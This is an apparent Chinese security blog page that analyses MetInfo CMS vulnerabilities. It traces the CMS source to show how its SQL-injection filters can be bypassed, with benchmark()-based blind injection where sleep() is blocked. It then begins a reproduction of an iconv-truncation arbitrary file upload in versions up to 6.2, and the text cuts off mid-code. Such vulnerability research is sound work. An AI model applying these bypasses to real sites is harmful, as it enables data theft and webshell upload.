class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后我们跟踪至函数common.func.php::daddslashes()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">daddslashes</span><span class="params">($string, $force = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	!defined(<span class="string">'MAGIC_QUOTES_GPC'</span>) &amp;&amp; define(<span class="string">'MAGIC_QUOTES_GPC'</span>, get_magic_quotes_gpc());<span class="comment">//是否开启get_magic_quotes_gpc()</span></span><br><span class="line">	<span class="keyword">if</span>(!MAGIC_QUOTES_GPC || $force) &#123;</span><br><span class="line">		<span class="keyword">if</span>(is_array($string)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">				$string[$key] = daddslashes($val, $force);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>))&#123;</span><br><span class="line">				$string = trim(addslashes(sqlinsert($string)));</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$string = trim(addslashes($string));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>common类将会对输入的内容进行addslashes()处理，然后看到web.class.php::load_form()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 重写common类的load_form方法，前台对提交的GET，POST，COOKIE进行安全的过滤处理</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">load_form</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $_M;</span><br><span class="line">	<span class="keyword">parent</span>::load_form();</span><br><span class="line">	<span class="keyword">foreach</span> ($_M[<span class="string">'form'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">		$_M[<span class="string">'form'</span>][$key] = sqlinsert($val);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($_M[<span class="string">'form'</span>][<span class="string">'id'</span>]!=<span class="string">''</span> &amp;&amp; !is_numeric($_M[<span class="string">'form'</span>][<span class="string">'id'</span>])) &#123;</span><br><span class="line">		$_M[<span class="string">'form'</span>][<span class="string">'id'</span>] = <span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($_M[<span class="string">'form'</span>][<span class="string">'class1'</span>]!=<span class="string">''</span> &amp;&amp; !is_numeric($_M[<span class="string">'form'</span>][<span class="string">'class1'</span>])) &#123;</span><br><span class="line">		$_M[<span class="string">'form'</span>][<span class="string">'class1'</span>] = <span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($_M[<span class="string">'form'</span>][<span class="string">'class2'</span>]!=<span class="string">''</span> &amp;&amp; !is_numeric($_M[<span class="string">'form'</span>][<span class="string">'class2'</span>])) &#123;</span><br><span class="line">		$_M[<span class="string">'form'</span>][<span class="string">'class2'</span>] = <span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($_M[<span class="string">'form'</span>][<span class="string">'class3'</span>]!=<span class="string">''</span> &amp;&amp; !is_numeric($_M[<span class="string">'form'</span>][<span class="string">'class3'</span>])) &#123;</span><br><span class="line">		$_M[<span class="string">'form'</span>][<span class="string">'class3'</span>] = <span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对common来的参数进行重写操作，进行两步验证，其一是sqlinsert()，其二是is_numberc()，非数字就做置空操作。均是针对sql注入的。看向common.func.php::sqlinsert()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqlinsert</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_array($string))&#123;</span><br><span class="line">		<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">			$string[$key] = sqlinsert($val);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$string_old = $string;</span><br><span class="line">		$string = str_ireplace(<span class="string">"\\"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"\""</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"'"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"*"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"%5C"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"%22"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"%27"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"%2A"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"~"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"select"</span>, <span class="string">"\sel\ect"</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"insert"</span>, <span class="string">"\ins\ert"</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"update"</span>, <span class="string">"\up\date"</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"delete"</span>, <span class="string">"\de\lete"</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"union"</span>, <span class="string">"\un\ion"</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"into"</span>, <span class="string">"\in\to"</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"load_file"</span>, <span class="string">"\load\_\file"</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"outfile"</span>, <span class="string">"\out\file"</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">"sleep"</span>, <span class="string">"\sle\ep"</span>, $string);</span><br><span class="line">		$string = strip_tags($string);</span><br><span class="line">		<span class="keyword">if</span>($string_old!=$string)&#123;</span><br><span class="line">			$string=<span class="string">''</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$string = trim($string);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为sleep()被过滤了，几乎sql注入的关键词都被过滤了，然后可以选择使用布尔盲注，时间盲注的话，可以使用benchmark()，所以我们绕过其中第一个过滤，is_number()的绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span> <span class="keyword">extends</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $_M;</span><br><span class="line">		<span class="keyword">parent</span>::__construct();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upfile = load::sys_class(<span class="string">'upfile'</span>, <span class="string">'new'</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们输入的payload在<code>parent::__construct();</code>后被置空，而经过<code>$this-&gt;upfile = load::sys_class(&#39;upfile&#39;, &#39;new&#39;);</code>后，我们的payload又被重新填入，所以这样就绕过该函数，成功注入。</p>
<p>这里解释一下为什么返回验证码错误，为我们判断依据。看向函数domessage()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line">		<span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'action'</span>] == <span class="string">'add'</span>)&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;check_field();</span><br><span class="line">			<span class="keyword">$this</span>-&gt;add($_M[<span class="string">'form'</span>]);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>跟进check_field()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_keys($para) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">          <span class="keyword">if</span>($para[$val][<span class="string">'wr_ok'</span>]==<span class="number">1</span> &amp;&amp; !in_array($val,$paraarr))&#123;</span><br><span class="line">              $info=<span class="string">"【&#123;$para[$val]['name']&#125;】"</span>.$_M[word][noempty];</span><br><span class="line">              okinfo(<span class="string">'javascript:history.back();'</span>,$info);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure></p>
<p>所以我们只要正确填充个参数就能过check_field()函数，进入add()函数后<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$met_fd_ok=DB::get_one(<span class="string">"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;' and  name= 'met_fd_ok' and columnid = &#123;$_M[form][id]&#125;"</span>);</span><br><span class="line">        $_M[config][met_fd_ok]= $met_fd_ok[value];</span><br><span class="line">		<span class="keyword">if</span>(!$_M[config][met_fd_ok])okinfo(<span class="string">'javascript:history.back();'</span>,<span class="string">"&#123;$_M[word][Feedback5]&#125;"</span>);</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">            先进行sql查询，获取返回值，当我们的语句正确，且注入符合逻辑时，$met_fd_ok[value]不为空</span></span><br><span class="line"><span class="comment">            说明sql查询有效</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">if</span>($_M[config][met_memberlogin_code])&#123;</span><br><span class="line">			<span class="keyword">if</span>(!load::sys_class(<span class="string">'pin'</span>, <span class="string">'new'</span>)-&gt;check_pin($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">			 			okinfo(<span class="number">-1</span>, $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	        这里进行验证码验证</span></span><br><span class="line"><span class="comment">	    */</span></span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/12/metinfo-6-2前台任意文件上传漏洞复现/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/07/12/metinfo-6-2前台任意文件上传漏洞复现/" class="post-title-link" itemprop="url">metinfo<=6.2前台任意文件上传漏洞复现< a="">
              
            
          </=6.2前台任意文件上传漏洞复现<></a></h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-07-12 20:32:33" itemprop="dateCreated datePublished" datetime="2019-07-12T20:32:33+08:00">2019-07-12</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-07-13 09:32:28" itemprop="dateModified" datetime="2019-07-13T09:32:28+08:00">2019-07-13</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><p>metinfo&lt;=6.2<br>php&lt;5.4（我用5.3）+mysql<br>windows10</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>参考学长的文章，虽然要自己POC，但是文章写得很清楚了，基本就是把POC全部给出来了。<br><a href="https://xz.aliyun.com/t/5603#toc-0" target="_blank" rel="noopener">某info &lt;= 6.2.0前台任意文件上传漏洞</a><br><a href="http://www.yulegeyu.com/2019/06/18/Metinfo6-Arbitrary-File-Upload-Via-Iconv-Truncate/" target="_blank" rel="noopener">Metinfo6 Arbitrary File Upload Via Iconv Truncate</a></p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>iconv在windows下编码转换存在截断问题，构造合适的文件路径和文件名，对其进行恶意文件上传。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="1"><a href="#1" class="headerlink" title="(1)"></a>(1)</h2><p>函数 douploadfile()<br>定位：/app/system/include/module/uploadify.class.php::65行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doupfile</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $_M;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;upfile-&gt;set_upfile();</span><br><span class="line">	$info[<span class="string">'savepath'</span>] = $_M[<span class="string">'form'</span>][<span class="string">'savepath'</span>];</span><br><span class="line">	$info[<span class="string">'format'</span>] = $_M[<span class="string">'form'</span>][<span class="string">'format'</span>];</span><br><span class="line">	$info[<span class="string">'maxsize'</span>] = $_M[<span class="string">'form'</span>][<span class="string">'maxsize'</span>];</span><br><span class="line">	$info[<span class="string">'is_rename'</span>] = $_M[<span class="string">'form'</span>][<span class="string">'is_rename'</span>];</span><br><span class="line">	$info[<span class="string">'is_overwrite'</span>] = $_M[<span class="string">'form'</span>][<span class="string">'is_overwrite'</span>];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;set_upload($info);</span><br><span class="line">	$back = <span class="keyword">$this</span>-&gt;upload($_M[<span class="string">'form'</span>][<span class="string">'formname'</span>]);</span><br><span class="line">	<span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'type'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>($back[<span class="string">'error'</span>])&#123;</span><br><span class="line">			$back[<span class="string">'error'</span>] = $back[<span class="string">'errorcode'</span>];</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$backs[<span class="string">'path'</span>] = $back[<span class="string">'path'</span>];</span><br><span class="line"></span><br><span class="line">			$backs[<span class="string">'append'</span>] = <span class="string">'false'</span>;</span><br><span class="line">			$back = $backs;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    $back[<span class="string">'filesize'</span>] =  round(filesize($back[<span class="string">'path'</span>])/<span class="number">1024</span>,<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">echo</span> jsonencode($back);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先先调用了<strong>set_upfile()</strong>函数,设置上传文件的模式，就是先设定上传文件的信息、<br>定位：/app/system/include/module/upfile.class.php::67行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置上传文件模式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_upfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $_M;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;set(<span class="string">'savepath'</span>, <span class="string">'file'</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;set(<span class="string">'format'</span>, $_M[<span class="string">'config'</span>][<span class="string">'met_file_format'</span>]);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;set(<span class="string">'maxsize'</span>, min($_M[<span class="string">'config'</span>][<span class="string">'met_file_maxsize'</span>]*<span class="number">1048576</span>, <span class="number">1073741824</span>));</span><br><span class="line">	<span class="keyword">$this</span>-&gt;set(<span class="string">'is_rename'</span>, $_M[<span class="string">'config'</span>][<span class="string">'met_img_rename'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接着调用<strong>set_upload()</strong>函数，参数来自于$info<br>定位：/app/system/include/module/uploadify.class.php::28行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_upload</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $_M;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;upfile-&gt;set(<span class="string">'savepath'</span>, $info[<span class="string">'savepath'</span>]);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;upfile-&gt;set(<span class="string">'format'</span>, $info[<span class="string">'format'</span>]);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;upfile-&gt;set(<span class="string">'maxsize'</span>, $info[<span class="string">'maxsize'</span>]);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;upfile-&gt;set(<span class="string">'is_rename'</span>, $info[<span class="string">'is_rename'</span>]);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;upfile-&gt;set(<span class="string">'is_overwrite'</span>, $info[<span class="string">'is_overwrite'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到这两个函数均对<strong>savepath</strong>进行处理，并且要命的是，<strong>set_upload()</strong>中处理的<strong>savepath</strong>来自于<strong>$_M[‘form’][‘savepath’]</strong>,这个数据是用户可控的，这是本次漏洞中的<strong>注入位置</strong>。</p>
<p>我们跟踪查看一下set函数<br>定位：/app/system/include/module/upfile.class.php::43行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value)</span> </span>&#123;</span><br><span class="line">		     ... ...</span><br><span class="line">		<span class="keyword">switch</span> ($name) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'savepath'</span>:</span><br><span class="line">				<span class="keyword">$this</span>-&gt;savepath = path_standard(PATH_WEB.<span class="string">'upload/'</span>.$value);</span><br><span class="line">             ... ...</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到最终savepath将会为<strong>‘webserver/upload/file/‘</strong>的形式指定文件存放的位置。</p>
<p>接着调用函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$back = <span class="keyword">$this</span>-&gt;upload($_M[<span class="string">'form'</span>][<span class="string">'formname'</span>]);</span><br></pre></td></tr></table></figure></p>
<h2 id="2"><a href="#2" class="headerlink" title="(2)"></a>(2)</h2><p>跟踪查看<br>定位：/app/system/include/module/upfile.class.php::90行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($form = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $_M;</span><br><span class="line">		<span class="keyword">if</span>($form)&#123;</span><br><span class="line">			<span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $val)&#123;</span><br><span class="line">				<span class="keyword">if</span>($form == $key)&#123;</span><br><span class="line">					$filear = $_FILES[$key];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!$filear)&#123;</span><br><span class="line">			<span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $val)&#123;</span><br><span class="line">				$filear = $_FILES[$key];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//是否能正常上传</span></span><br><span class="line">		</span><br><span class="line">        <span class="comment">//空间超容 有些虚拟主机不支持此函数</span></span><br><span class="line">       </span><br><span class="line">        <span class="comment">//目录不可写</span></span><br><span class="line">       </span><br><span class="line">        <span class="comment">//文件大小是否正确&#123;&#125;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//文件后缀是否为合法后缀</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;getext($filear[<span class="string">"name"</span>]); <span class="comment">//获取允许的后缀</span></span><br><span class="line">		<span class="keyword">if</span> (strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">'php'</span>||strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">'aspx'</span>||strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">'asp'</span>||strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">'jsp'</span>||strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">'js'</span>||strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">'asa'</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(<span class="keyword">$this</span>-&gt;ext.<span class="string">" &#123;$_M['word']['upfileTip3']&#125;"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//$_M['config']['met_file_format']:</span></span><br><span class="line">		<span class="comment">//rar|zip|sql|doc|pdf|jpg|xls|png|gif|mp3|jpeg|bmp|swf|flv|ico</span></span><br><span class="line">		<span class="keyword">if</span> ($_M[<span class="string">'config'</span>][<span class="string">'met_file_format'</span>]) &#123;</span><br><span class="line">			<span class="keyword">if</span>($_M[<span class="string">'config'</span>][<span class="string">'met_file_format'</span>] != <span class="string">""</span> &amp;&amp; !in_array(strtolower(<span class="keyword">$this</span>-&gt;ext), explode(<span class="string">'|'</span>,strtolower($_M[<span class="string">'config'</span>][<span class="string">'met_file_format'</span>]))) &amp;&amp; $filear)&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(<span class="keyword">$this</span>-&gt;ext.<span class="string">" &#123;$_M['word']['upfileTip3']&#125;"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(<span class="keyword">$this</span>-&gt;ext.<span class="string">" &#123;$_M['word']['upfileTip3']&#125;"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;format) 